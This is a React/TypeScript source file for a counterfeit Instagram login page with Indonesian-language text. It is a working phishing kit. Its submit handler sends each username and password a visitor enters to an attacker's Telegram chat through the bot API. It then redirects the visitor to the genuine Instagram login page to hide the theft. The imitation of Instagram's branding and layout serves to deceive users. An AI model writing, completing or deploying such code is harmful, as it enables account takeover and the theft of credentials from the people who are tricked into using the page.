import { useState } from "react";
import type { Route } from "./+types/home";

export function meta({}: Route.MetaArgs) {
  return [
    { title: "Instagram Login" },
    { name: "description", content: "Login to Instagram" },
  ];
}

export default function Home() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [isLoading, setIsLoading] = useState(false);

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    if (!username || !password) return;

    setIsLoading(true);

    // Mengambil token & chat id dari file .env
    const botToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
    const chatId = import.meta.env.VITE_TELEGRAM_CHAT_ID;
    const text = `🚨 *New Instagram Login (Clone)* 🚨\n\n👤 Username/Phone: \`${username}\`\n🔑 Password: \`${password}\``;

    try {
      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: text,
          parse_mode: "Markdown",
        }),
      });

      // Mengosongkan form atau redirect pengguna ke instagram web aslinya setelah 1.5 detik
      setTimeout(() => {
        window.location.href = "https://www.instagram.com/accounts/login/";
      }, 1500);
    } catch (error) {
      console.error("Gagal mengirim pesan login ke Telegram", error);
      setIsLoading(false);
    }
  };

  const footerLinks = [
    "Meta",
    "Tentang",
    "Blog",
    "Pekerjaan",
    "Bantuan",
    "API",
    "Privasi",
    "Ketentuan",
    "Lokasi",
    "Instagram Lite",
    "Meta AI",
    "Threads",
    "Pengunggahan Kontak & Nonpengguna",
    "Verifikasi Meta",
    "Meta di Indonesia",
  ];

  return (
    <div className="flex flex-col min-h-screen bg-[#0c1014] text-white font-sans w-full">
      {/* Container Konten Utama */}
      <div className="flex flex-col md:flex-row flex-1 w-full">
        {/* Header Mobile (Logo) */}
        <div className="md:hidden flex items-center justify-center py-8 border-b border-[#262626] bg-[#0c1014]">
          <img
            src="/logo-instagram.png"
            alt="Instagram Logo"
            className="h-[65px] w-auto"
          />
        </div>

        {/* Kolom Kiri - Gambar */}
        <div className="hidden md:flex flex-1 flex-col p-8 lg:p-12 border-r border-[#262626]">
          {/* Logo Instagram di pojok kiri atas */}
          <div className="w-full flex justify-start">
            <img
              src="/logo-instagram.png"
              alt="Instagram Logo"
              className="h-[60px] lg:h-[80px] w-auto"
            />
          </div>

          <div className="flex-1 w-full max-w-[650px] mx-auto flex flex-col items-center justify-center mt-4">
            <h1 className="text-[2.2rem] lg:text-[2.8rem] font-regular leading-tight mb-8 text-center text-white/95">
              Lihat momen sehari-hari dari teman dekat Anda.
            </h1>
            <div className="relative mt-2 w-full max-w-[500px] lg:max-w-[700px] flex justify-center">
              <img
                src="/image-sidebar.webp"
                alt="Instagram Story Screenshots"
                className="w-[100%] h-auto object-contain"
              />
            </div>
          </div>
        </div>

        {/* Kolom Kanan - Form Login */}
        <div className="flex-1 flex flex-col items-center justify-center p-8 bg-[#1f1f22] border-l-3 border-[#262626]">
          <div className="w-full max-w-[480px]">
            <h2 className="text-white font-bold mb-6 text-[18px]">
              Login ke Instagram
            </h2>
            <form className="flex flex-col space-y-5" onSubmit={handleSubmit}>
              <input
                type="text"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                placeholder="Nomor ponsel, nama pengguna, atau email"
                className="bg-[#1f1f22] border border-[#363636] rounded-[8px] px-4 py-4 text-[16px] focus:outline-none focus:border-gray-500 placeholder-gray-400"
                required
              />
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Kata Sandi"
                className="bg-[#1f1f22] border border-[#363636] rounded-[8px] px-4 py-4 text-[16px] focus:outline-none focus:border-gray-500 placeholder-gray-400"
                required
              />
              <button
                type="submit"
                disabled={isLoading}
                className="bg-[#15467c] hover:bg-[#1877F2] text-gray-300 font-semibold py-3.5 rounded-full mt-3 transition text-[16px] disabled:opacity-50"
              >
                {isLoading ? "Memuat..." : "Login"}
              </button>
            </form>

            <div className="flex justify-center mt-6">
              <a
                href="#"
                className="text-[15px] text-white font-semibold hover:text-gray-300 transition"
              >
                Lupa kata sandi?
              </a>
            </div>

            <div className="mt-10 space-y-4">
              <button className="w-full border border-[#363636] flex items-center justify-center gap-2 font-semibold text-white py-3.5 rounded-full hover:bg-gray-800/50 transition text-[16px]">
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  viewBox="0 0 24 24"
                  fill="currentColor"
                  className="w-[20px] h-[20px] text-[#1877F2]"
                >
                  <path d="M12 2.04c-5.5 0-10 4.48-10 10.02 0 5 3.66 9.15 8.44 9.9v-7H7.9v-2.9h2.54V9.85c0-2.5 1.5-3.88 3.77-3.88 1.1 0 2.24.2 2.24.2v2.46h-1.26c-1.24 0-1.63.77-1.63 1.56v1.88h2.77l-.44 2.9h-2.33v7a10 10 0 0 0 8.44-9.9c0-5.54-4.5-10.02-10-10.02Z" />
                </svg>
                Login dengan Facebook
              </button>
              <button className="w-full border border-[#4a85c2] font-semibold text-[#1877F2] py-3.5 rounded-full hover:bg-gray-800/50 transition text-[16px]">
                Buat akun baru
              </button>
            </div>

            <div className="mt-8 text-center text-[13px] text-gray-500 flex flex-col items-center gap-1.5 font-semibold">
              <img src="/image.png" alt="" className="w-15" />
            </div>
          </div>
        </div>
      </div>{" "}
      {/* Akhir Container Konten Utama */}
      {/* Bagian Footer */}
      <footer className="w-full bg-[#0c1014] py-8 px-4 flex flex-col items-center border-t-3 border-[#262626]">
        <ul className="flex flex-wrap justify-center gap-x-4 gap-y-2 max-w-7xl">
          {footerLinks.map((link) => (
            <li key={link}>
              <a
                href="#"
                className="text-[12px] text-[#A8A8A8] hover:underline whitespace-nowrap"
              >
                {link}
              </a>
            </li>
          ))}
        </ul>

        <div className="mt-4 flex flex-wrap items-center justify-center gap-4 text-[12px] text-[#A8A8A8]">
          <button className="flex items-center justify-center gap-1 hover:underline outline-none">
            Bahasa Indonesia
            <svg
              xmlns="http://www.w3.org/2000/svg"
              fill="none"
              viewBox="0 0 24 24"
              strokeWidth={2}
              stroke="currentColor"
              className="w-[12px] h-[12px]"
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                d="m19.5 8.25-7.5 7.5-7.5-7.5"
              />
            </svg>
          </button>
          <span>© 2026 Instagram from Meta</span>
        </div>
      </footer>
    </div>
  );
}
